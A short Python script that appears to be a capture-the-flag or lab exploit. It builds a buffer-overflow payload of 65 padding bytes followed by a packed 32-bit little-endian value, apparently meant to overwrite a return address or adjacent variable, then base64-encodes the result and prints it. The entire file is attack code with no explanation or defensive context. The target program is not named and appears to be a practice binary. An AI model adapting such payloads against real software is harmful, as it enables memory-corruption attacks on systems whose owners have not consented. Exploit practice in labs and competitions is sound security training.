
import sys
import struct
import base64

buf = b'LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL'
buf += struct.pack('<I', 801268652)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
